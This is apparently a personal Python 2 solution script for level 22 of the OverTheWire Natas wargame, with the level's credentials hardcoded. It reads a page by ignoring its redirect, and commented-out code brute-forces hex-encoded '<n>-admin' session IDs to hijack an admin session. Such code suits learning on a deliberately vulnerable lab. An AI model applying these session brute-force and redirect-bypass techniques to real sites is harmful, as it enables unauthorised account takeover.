import requests
import datetime
import sys
import re
import datetime

from string import * 

key  = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
user = 'natas22'
url  = 'http://natas22.natas.labs.overthewire.org'


#cookies are encode like this:
# 123-<username> as hex 

r = requests.Session();
r.auth = (user,key)

response = r.get(url + '?revelio' , cookies={'PHPSESSID':'1'}, allow_redirects=False)
# response = r.post(url + '?debug' ,  data={'name[]' : 'admin'})

print response.headers
print response.text

# for i in range(1,641):

#     session_string = `i` + '-admin'
#     print 'request sessionid', str(i)
    
#     response = r.get(url, cookies={'PHPSESSID': session_string.encode('hex') })
#     if ( 'Password:' in response.text ):
#         print response.text
#         break


# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))
